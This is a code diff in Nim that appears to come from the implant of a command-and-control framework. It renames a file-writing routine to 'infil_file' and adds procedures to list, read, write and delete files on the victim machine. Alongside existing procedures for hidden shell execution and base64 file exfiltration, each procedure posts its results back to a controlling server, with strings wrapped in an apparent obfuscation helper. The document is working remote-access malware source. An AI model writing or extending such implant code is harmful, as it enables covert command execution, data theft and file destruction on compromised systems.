@@ -1,4 +1,4 @@
-import config
+import config, file
 import std/[strformat, tables, nativesockets, streams, random, json, base64, encodings]
 import system/[io]
 import httpclient
@@ -7,14 +7,13 @@ import nimcrypto
 import strutils
 import osproc
 
-
 # Core functions
 proc post_data*(client: HttpClient, command_type: string, data_dict: string): bool
 
 # Command executors
 proc run_shell_command*(client: HttpClient, shell_command: string): bool
 proc exfil_file*(client: HttpClient, file_path: string): bool
-proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
+proc infil_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
 proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool
 proc die*(client: HttpClient): void
 
@@ -44,50 +43,40 @@ proc run_shell_command*(client: HttpClient, shell_command: string): bool =
     var output: string
     var retval: int
     var is_success = true
-
-    (output, retval) = execCmdEx(shell_command, options={poDaemon})
-    
+    (output, retval) = execCmdEx(shell_command, options={poDaemon})  
     if retval != 0:
         output = protectString("Error: shell return value = ") & $retval 
         is_success = false 
-
     var data = {
         protectString("shell_command"): shell_command,
         protectString("is_success"): $is_success,
         protectString("output"): "\n" & output
-    }.toOrderedTable()
-    
+    }.toOrderedTable() 
     is_success = post_data(client, protectString("cmd"), $data)
-    
     return is_success
 
 
 proc exfil_file*(client: HttpClient, file_path: string): bool = 
     var is_success: bool
     var file_content_base64: string
-
     try:
         file_content_base64 = encode_64(readFile(file_path), is_bin=true)
         is_success = true
     except:
         file_content_base64 = could_not_retrieve
         is_success = false
-    
     var data = {
         protectString("is_success"): $is_success,
         protectString("file_path"): file_path,
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable()
-    
     is_success = post_data(client, protectString("download") , $data)
-
     return is_success
 
 
-proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool =
+proc infil_file*(client: HttpClient, file_data_base64: string, file_path: string): bool =
     var is_success: bool
     var f = newFileStream(file_path, fmWrite)
-    
     if isNil(f):
         is_success = false
     else:
@@ -95,14 +84,53 @@ proc write_file*(client: HttpClient, file_data_base64: string, file_path: string
         f.write(file_data)
         f.close()
         is_success = true
-    
     var data = {
         protectString("is_success"): $is_success,
         protectString("file_upload_path"): file_path,
     }.toOrderedTable()
-    
     is_success = post_data(client, protectString("upload") , $data)
+    return is_success
 
+
+proc list_dir*(client: HttpClient, path: string, is_recurse: bool): bool =
+    var (content, is_success) = list_directory(path, is_recurse)
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("path"): path,
+        protectString("content"): "\n" & content
+    }.toOrderedTable()
+    is_success = post_data(client, protectString("listdir") , $data)
+    return is_success
+
+
+proc fread*(client: HttpClient, path: string): bool =
+    var (content, is_success) = file_read(path)
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("path"): path,
+        protectString("content"): "\n" & content
+    }.toOrderedTable()
+    is_success = post_data(client, protectString("fread") , $data)
+    return is_success
+
+
+proc fwrite*(client: HttpClient, path: string, content: string, append: bool): bool =
+    var is_success = file_write_or_append(path, content, append)
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("path"): path
+    }.toOrderedTable()
+    is_success = post_data(client, protectString("fwrite") , $data)
+    return is_success
+
+
+proc fdelete*(client: HttpClient, path: string): bool =
+    var is_success = file_delete(path)
+    var data = {
+        protectString("is_success"): $is_success,
+        protectString("path"): path
+    }.toOrderedTable()
+    is_success = post_data(client, protectString("fdelete") , $data)
     return is_success
 
 
